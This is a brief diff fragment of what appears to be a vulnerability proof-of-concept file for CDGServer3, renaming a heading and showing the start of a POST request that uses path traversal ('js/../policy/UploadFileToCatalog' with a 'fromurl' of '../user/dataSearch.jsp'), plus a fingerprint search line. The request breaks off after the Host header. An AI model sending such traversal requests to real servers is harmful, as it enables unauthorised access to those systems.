@@ -7,7 +7,7 @@
 body="/CDGServer3/index.jsp"
 ```
 
-## poc
+## POC
 ```
 POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
 Host: 127.0.0.1
